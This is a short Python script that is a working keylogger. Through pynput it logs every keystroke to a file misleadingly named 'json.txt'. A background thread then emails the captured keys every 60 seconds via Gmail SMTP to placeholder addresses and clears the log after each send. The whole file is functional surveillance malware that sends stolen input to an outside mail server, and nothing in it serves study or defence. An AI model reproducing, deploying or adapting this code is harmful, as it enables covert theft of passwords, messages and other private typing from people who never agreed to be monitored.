from threading import Timer, Thread
from pynput.keyboard import Key, Listener
import time
import smtplib

# method to send email
def sendemail(from_addr, to_addr_list, cc_addr_list, subject, message, login, password, smtpserver='smtp.gmail.com:587'):
    header  = 'From: %s\n' % from_addr
    header += 'To: %s\n' % ','.join(to_addr_list)
    header += 'Cc: %s\n' % ','.join(cc_addr_list)
    header += 'Subject: %s\n' % subject
    message = header + message
 
    server = smtplib.SMTP(smtpserver)
    server.starttls()
    server.login(login,password)
    problems = server.sendmail(from_addr, to_addr_list, message)
    server.quit()

# when a key is pressed
def on_press(key):
    f= open('json.txt', 'a')
    f.write(str(key))
    f.close()
    
# this is the main loop that sends the email on a fixed interval
def printit():
    while True:
        time.sleep(60.0) # send email after every 60 seconds
        f= open('json.txt', 'r+')
        msg = f.read()
        f.truncate(0)
        sendemail(from_addr = FROM_ADDR, to_addr_list = [TO_ADDR], cc_addr_list = [CC_ADDR], subject = 'Update', message = '\n'+ msg, login=EMAIL_USERNAME, password = EMAIL_PASSWORD)
        #print('Sent') #Used for debugging purpose
        f.close()

t = Thread(target=printit)
t.start()

with Listener(on_press=on_press) as listener:
    listener.join()

t.join()